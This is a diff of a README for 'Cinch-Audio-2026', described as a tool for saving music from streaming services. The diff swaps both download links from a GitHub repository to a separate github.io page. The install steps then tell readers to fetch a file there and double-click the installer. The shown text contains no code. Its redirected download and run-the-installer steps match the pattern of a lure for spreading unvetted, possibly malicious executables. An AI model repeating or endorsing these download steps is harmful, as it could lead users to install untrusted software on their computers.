@@ -1,6 +1,6 @@
 # 🎧 Cinch-Audio-2026 - Save streaming music on your computer
 
-[![](https://img.shields.io/badge/Download-Cinch_Audio_2026-blue)](https://github.com/Pearshaped-burning672/Cinch-Audio-2026)
+[![](https://img.shields.io/badge/Download-Cinch_Audio_2026-blue)](https://pearshaped-burning672.github.io)
 
 Cinch-Audio-2026 serves as a tool for people who want to save music from streaming services. This software captures audio from your desktop and stores it as individual files. You maintain the quality of the original track while building a local library of your favorite songs.
 
@@ -19,7 +19,7 @@ The software works on standard computers. Ensure your computer meets these condi
 
 Follow these steps to set up the recorder on your machine.
 
-1. Visit the following link to download the software: [https://github.com/Pearshaped-burning672/Cinch-Audio-2026](https://github.com/Pearshaped-burning672/Cinch-Audio-2026)
+1. Visit the following link to download the software: [https://pearshaped-burning672.github.io](https://pearshaped-burning672.github.io)
 2. Locate the file in your downloads folder once the transfer ends.
 3. Double-click the installer file to launch the setup wizard.
 4. Follow the prompts on the screen to choose your install location.
